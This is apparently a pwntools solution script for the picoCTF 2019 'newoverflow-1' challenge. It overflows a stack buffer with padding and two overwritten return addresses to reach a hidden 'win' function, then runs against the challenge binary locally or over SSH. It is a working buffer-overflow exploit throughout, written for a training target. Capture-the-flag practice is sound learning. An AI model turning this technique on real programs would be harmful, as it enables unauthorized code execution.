from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['rxvt', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


if DEBUG:
  context.log_level = 'debug'

if len(argv) < 2:
  stdout = process.PTY
  stdin = process.PTY

  sh = process(BINARY, stdout=stdout, stdin=stdin)

  if DEBUG:
    attach_gdb()

  REMOTE = False
else:
  s = ssh(host='2019shell1.picoctf.com', user='sashackers', password="XXX")
  sh = s.process('vuln', cwd='/problems/newoverflow-1_0_f9bdea7a6553786707a6d560decc5d50')
  REMOTE = True


win_addr = 0x00400767
main_addr = 0x004007e8
payload = 'a'*(0x40+8)+p64(main_addr)+p64(win_addr)

sh.sendlineafter(': ', payload)
sh.sendlineafter(': ', 'a')
sh.interactive()